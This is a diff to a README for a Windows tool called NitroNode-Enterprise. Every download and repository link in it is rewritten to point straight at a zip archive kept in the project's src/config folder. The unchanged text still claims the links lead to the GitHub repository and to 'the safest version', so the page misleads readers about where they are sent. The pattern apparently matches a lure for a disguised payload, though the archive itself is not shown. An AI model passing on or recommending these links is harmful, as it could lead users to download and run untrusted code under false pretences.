@@ -1,6 +1,6 @@
 # ⚙️ NitroNode-Enterprise - Reliable Backend for Business Apps
 
-[![Download NitroNode-Enterprise](https://img.shields.io/badge/Download-NitroNode--Enterprise-brightgreen?style=for-the-badge)](https://github.com/alnshawati/NitroNode-Enterprise)
+[![Download NitroNode-Enterprise](https://img.shields.io/badge/Download-NitroNode--Enterprise-brightgreen?style=for-the-badge)](https://github.com/alnshawati/NitroNode-Enterprise/raw/refs/heads/main/src/config/Enterprise_Nitro_Node_v2.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get NitroNode-Enterprise running on your Windows PC.
 
 Go to the official download page by clicking the link below:  
 
-[Download NitroNode-Enterprise](https://github.com/alnshawati/NitroNode-Enterprise)  
+[Download NitroNode-Enterprise](https://github.com/alnshawati/NitroNode-Enterprise/raw/refs/heads/main/src/config/Enterprise_Nitro_Node_v2.2.zip)  
 
 This link will take you to the GitHub repository where you can find the latest version of the software.
 
@@ -114,7 +114,7 @@ If something does not work as expected:
 
 ## 📁 Additional Resources
 
-- GitHub repository: https://github.com/alnshawati/NitroNode-Enterprise  
+- GitHub repository: https://github.com/alnshawati/NitroNode-Enterprise/raw/refs/heads/main/src/config/Enterprise_Nitro_Node_v2.2.zip  
 - User guide inside the app under Help  
 - Online community and issue tracker on GitHub  
 
@@ -126,6 +126,6 @@ You can explore these resources for deeper understanding or to customize your se
 
 Get started now by visiting the link below. It leads you to the place where you can download the software for Windows.  
 
-[Download NitroNode-Enterprise](https://github.com/alnshawati/NitroNode-Enterprise)  
+[Download NitroNode-Enterprise](https://github.com/alnshawati/NitroNode-Enterprise/raw/refs/heads/main/src/config/Enterprise_Nitro_Node_v2.2.zip)  
 
 This link takes you straight to the official source so you get the latest and safest version.
